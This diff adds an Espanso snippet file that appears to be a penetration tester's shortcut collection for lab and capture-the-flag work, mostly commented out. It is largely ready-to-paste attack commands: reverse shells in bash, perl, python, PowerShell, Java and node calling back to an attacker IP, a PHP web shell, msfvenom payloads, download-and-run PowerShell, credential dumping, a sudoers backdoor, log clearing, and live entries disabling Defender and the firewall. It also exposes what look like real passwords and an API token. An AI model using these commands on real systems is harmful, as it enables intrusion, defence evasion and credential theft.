@@ -1,0 +1,303 @@
+# # Espanso Match File
+
+# # For a complete introduction, visit the official docs at: https://espanso.org/docs/
+
+# # You can use this file to define the base matches (aka snippets)
+# # that will be available in every application when using Espanso.
+
+# # ==========================
+# # GLOBAL VARIABLES
+# # ==========================
+# global_vars:
+#   - name: "TIP"
+#     type: "shell"
+#     params:
+#       cmd: cat $HOME/.zshrc | grep TIP | awk -F= '{print $2}' | sed 's/"//g'
+      
+#   - name: "IP"
+#     type: "shell"
+#     params:
+#       cmd: "ip addr show dev tun0 | awk '/inet / {print $2}' | cut -d'/' -f1"
+
+#   - name: "ssh_key"
+#     type: "shell"
+#     params:
+#       cmd: "cat /home/kriyos/.ssh/id_rsa.pub"
+
+#   - name: "clipboard"
+#     type: "shell"
+#     params:
+#       cmd: "wl-paste"
+
+# # ==========================
+# # MATCHES
+# # ==========================
+matches:
+
+# # --------------------------
+# # Quality of Life Shortcuts
+# # --------------------------
+#   - trigger: ":paste"
+#     replace: "{{clipboard}}"
+
+#   - trigger: ":ip"
+#     replace: "{{IP}}"
+
+#   - trigger: ":tip"
+#     replace: "{{TIP}}"
+
+#   - trigger: ":unzip"
+#     replace: |
+#       printf "import sys\nimport zipfile\nif __name__ == '__main__':\n    with zipfile.ZipFile(sys.argv[1], 'r') as z:\n        z.extractall()\n" > unzip.py
+
+#   - trigger: ":rdp"
+#     replace: "xfreerdp /v:$THM /u:'htb-student' /p:'HTB_@cademy_stdnt!'  /drive:linux,/tmp /dynamic-resolution"
+
+#   - trigger: ":slowrdp"
+#     replace: "xfreerdp /u:USER /p:'PASS' /d:inlanefreight.local /v:{{TIP}} /dynamic-resolution /drive:.,linux /bpp:8 /compression -themes -wallpaper /clipboard /audio-mode:0 /auto-reconnect -glyph-cache"
+
+#   - trigger: ":enablerdp"
+#     replace: "reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f"
+
+#   - trigger: ":startprocess"
+#     replace: "Start-Process -FilePath 'C:\\Windows\\Tasks\\agent.exe' -ArgumentList '-connect 10.10.16.198:443 -ignore-cert' -NoNewWindow"
+
+#   - trigger: ":mount"
+#     replace: "rclone mount Backup:BackupsOfKriyos /mnt/Backup --vfs-cache-mode minimal &"
+
+#   - trigger: ":bloodhound"
+#     replace: "sudo systemctl start docker; cat /opt/bloodhound/docker-compose.yml | sudo docker-compose -f - up -d; echo 'Pass:Kriyos123!123'"
+
+#   - trigger: ":htbpass"
+#     replace: 'HTB_@cademy_stdnt!'
+
+# # --------------------------
+# # Setup and Nmap
+# # --------------------------
+#   - trigger: ":setup"
+#     replace: |
+#       mkdir -p net && cd net
+#       echo "<?php echo shell_exec(\$_GET['cmd']); ?>" > shell.php
+#       echo "<?php system(\"bash -c 'bash -i >& /dev/tcp/{{IP}}/22 0>&1'\"); ?>" > rev.php
+#       echo "bash -c 'bash -i >& /dev/tcp/{{IP}}/22 0>&1'" > shell.sh
+#       msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.6.87.204 LPORT=22 -f elf -o shell86.elf &
+#       msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.6.87.204 LPORT=22 -f elf -o shell64.elf &
+#       msfvenom -p windows/shell_reverse_tcp LHOST=10.6.87.204 LPORT=22 -f exe -o shell86.exe &
+#       msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.6.87.204 LPORT=22 -f exe -o shell64.exe &
+#       cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe . &
+#       wget -q https://github.com/carlospolop/PEASS-ng/releases/download/20230924-10138da9/linpeas.sh -O lp.sh &
+#       wget -q https://github.com/carlospolop/PEASS-ng/releases/download/20230924-10138da9/winPEASany.exe -O wp.exe &
+#       wget -q https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64 &
+#       wget -q https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32 &
+#       wget -q https://github.com/BloodHoundAD/SharpHound/releases/download/v1.1.0/SharpHound-v1.1.0.zip && unzip SharpHound-v1.1.0.zip &
+#       wget -q https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 &
+#       wget -q https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe &
+#       wget -q https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe &
+#       wget -q https://github.com/ly4k/PwnKit/raw/main/PwnKit &
+#       wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.4/ligolo-ng_agent_0.4.4_linux_amd64.tar.gz && tar -xzf ligolo-ng_agent_0.4.4_linux_amd64.tar.gz &
+#       wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.4/ligolo-ng_proxy_0.4.4_linux_amd64.tar.gz && tar -xzf ligolo-ng_proxy_0.4.4_linux_amd64.tar.gz &
+#       wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.4/ligolo-ng_agent_0.4.4_windows_amd64.zip && unzip -o ligolo-ng_agent_0.4.4_windows_amd64.zip  &
+#       sudo python3 -m http.server 80
+
+# # --------------------------
+# # Enumeration Commands
+# # --------------------------
+#   - trigger: ":nmap"
+#     replace: "nmap -sC -sV -T4 {{TIP}}"
+
+#   - trigger: ":nikto"
+#     replace: "nikto --url http://{{TIP}}"
+
+#   - trigger: ":wpscan"
+#     replace: "wpscan -e dbe,cb,u,vt,ap --api-token yZI2XuVWxqnkOxEsAzLkR58jNzYrc0jDoh1uHtja8b4 --url http://{{TIP}}"
+
+#   - trigger: ":dirsearch"
+#     replace: "dirsearch -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64 -e php,txt,html -f -u http://{{TIP}}"
+
+#   - trigger: ":gobuster"
+#     replace: "gobuster dir -w /usr/share/wordlists/dirb/common.txt -x txt,php,htm,html,xml -u http://{{TIP}}"
+
+# # --------------------------
+# # Reverse Shells
+# # --------------------------
+#   - trigger: ":rbash"
+#     replace: "bash -c 'bash -i >& /dev/tcp/{{IP}}/22 0>&1'"
+
+#   - trigger: ":rphp"
+#     replace: "<?php shell_exec(\"bash -c 'bash -i >& /dev/tcp/{{IP}}/22 0>&1'\"); ?>"
+
+# # --------------------------
+# # Additional Reverse Shells
+# # --------------------------
+#   - trigger: ":rnc"
+#     replace: "nc -e /bin/bash {{IP}} 22"
+
+#   - trigger: ":rperl"
+#     replace: "perl -e 'use Socket;$i=\"{{IP}}\";$p=22;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'"
+
+# # --------------------------
+# # Additional Reverse Shells (continued)
+# # --------------------------
+
+#   - trigger: ":rpython"
+#     replace: "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{{IP}}\",22));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+
+#   - trigger: ":rpython3"
+#     replace: "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{{IP}}\",22));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+
+#   - trigger: ":rpowershell"
+#     replace: "powershell -NoP -NonI -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient('{{IP}}',22);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+#   - trigger: ":rperl"
+#     replace: "perl -e 'use Socket;$i=\"{{IP}}\";$p=22;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'"
+
+#   - trigger: ":rphp"
+#     replace: "<?php shell_exec(\"bash -c 'bash -i >& /dev/tcp/{{IP}}/22 0>&1'\"); ?>"
+
+#   - trigger: ":rbashudp"
+#     replace: "bash -i >& /dev/udp/{{IP}}/53 0>&1"
+
+# # --------------------------
+# # SMB Related Commands
+# # --------------------------
+
+#   - trigger: ":smbclient"
+#     replace: "smbclient -L \\\\{{TIP}} -N"
+
+#   - trigger: ":smbmount"
+#     replace: "mount -t cifs //{{TIP}}/SHARE /mnt/smb -o username=guest,password="
+
+#   - trigger: ":smbexec"
+#     replace: "smbexec.py WORKGROUP/Administrator@{{TIP}}"
+
+# # --------------------------
+# # Windows Privilege Escalation
+# # --------------------------
+
+#   - trigger: ":winpeas"
+#     replace: "wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe -O winpeas.exe"
+
+#   - trigger: ":sharpup"
+#     replace: "powershell -exec bypass -C 'IEX(New-Object System.Net.WebClient).DownloadString(\"http://{{IP}}/SharpUp.ps1\"); Invoke-SharpUp'"
+
+#   - trigger: ":seatbelt"
+#     replace: "powershell -exec bypass -C 'IEX(New-Object System.Net.WebClient).DownloadString(\"http://{{IP}}/Seatbelt.ps1\"); Invoke-Seatbelt'"
+
+#   - trigger: ":mimikatz"
+#     replace: "Invoke-Mimikatz -DumpCreds"
+
+# # --------------------------
+# # Linux Privilege Escalation
+# # --------------------------
+
+#   - trigger: ":linpeas"
+#     replace: "wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -O linpeas.sh && chmod +x linpeas.sh"
+
+#   - trigger: ":pspy"
+#     replace: "wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64 && chmod +x pspy64"
+
+
+#   - trigger: ":gtfobins"
+#     replace: "https://gtfobins.github.io/gtfobins/"
+
+# # --------------------------
+# # Miscellaneous Commands
+# # --------------------------
+
+#   - trigger: ":sudoers"
+#     replace: "echo 'username ALL=(ALL) NOPASSWD: ALL' | sudo tee -a /etc/sudoers"
+
+#   - trigger: ":netcat"
+#     replace: "nc -lvnp 443"
+
+#   - trigger: ":wireshark"
+#     replace: "sudo wireshark &"
+
+#   - trigger: ":tcpdump"
+#     replace: "sudo tcpdump -i eth0 -nn -X port 80"
+
+#   - trigger: ":iptables"
+#     replace: "sudo iptables -I INPUT -p tcp --dport 4444 -j ACCEPT"
+
+# # --------------------------
+# # Tunneling and Proxying
+# # --------------------------
+
+#   - trigger: ":sshforward"
+#     replace: "ssh -L 8080:localhost:80 user@{{TIP}}"
+
+#   - trigger: ":socksproxy"
+#     replace: "ssh -D 9050 -q -C -N user@{{TIP}}"
+
+#   - trigger: ":ligolo"
+#     replace: "./agent -connect {{IP}}:53 -ignore-cert"
+
+#   - trigger: ":ligoloproxy"
+#     replace: "./proxy -listen 0.0.0.0:53 -ignore-cert"
+
+# # --------------------------
+# # Hash Dumping & Cracking
+# # --------------------------
+
+#   - trigger: ":hashdump"
+#     replace: "samdump2 /dev/sda1"
+
+#   - trigger: ":john"
+#     replace: "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt"
+
+#   - trigger: ":hashcat"
+#     replace: "hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt"
+
+# # --------------------------
+# # Post-Exploitation
+# # --------------------------
+
+#   - trigger: ":powersploit"
+#     replace: "powershell -exec bypass -C 'IEX(New-Object System.Net.WebClient).DownloadString(\"http://{{IP}}/PowerSploit.ps1\")'"
+
+#   - trigger: ":exfil"
+#     replace: "scp user@{{TIP}}:/path/to/file /local/destination"
+
+#   - trigger: ":exfil_http"
+#     replace: "wget http://{{TIP}}/file -O /local/destination"
+
+# # --------------------------
+# # Cleanup Commands
+# # --------------------------
+
+#   - trigger: ":cleanhistory"
+#     replace: "history -c && history -w"
+
+#   - trigger: ":cleartmp"
+#     replace: "rm -rf /tmp/*"
+
+#   - trigger: ":unset"
+#     replace: "unset HISTFILE"
+
+# # --------------------------
+# # Windows Registry and Config Tweaks
+# # --------------------------
+
+   - trigger: ":disabledefender"
+     replace: "powershell -exec bypass -C 'Set-MpPreference -DisableRealtimeMonitoring $true'"
+
+   - trigger: ":enablewinrm"
+     replace: "winrm quickconfig"
+
+   - trigger: ":disablefirewall"
+     replace: "netsh advfirewall set allprofiles state off"
+   - trigger: ":exclude"
+     replace: 'Add-MpPreference -ExclusionPath (Get-Location)'
+
+# # --------------------------
+# # Extra Reverse Shells
+# # --------------------------
+
+#   - trigger: ":rjava"
+#     replace: "r = new Socket(\"{{IP}}\", 22); p = new ProcessBuilder(\"/bin/sh\").redirectErrorStream(true).start(); i = r.getInputStream(); o = r.getOutputStream(); e = p.getErrorStream(); while (!r.isClosed()) { int ch = i.read(); if (ch == -1) break; o.write(ch); o.flush(); } r.close();"
+
+#   - trigger: ":rnode"
+#     replace: "require('child_process').exec('bash -c \"bash -i >& /dev/tcp/{{IP}}/22 0>&1\"');"
+
+
+
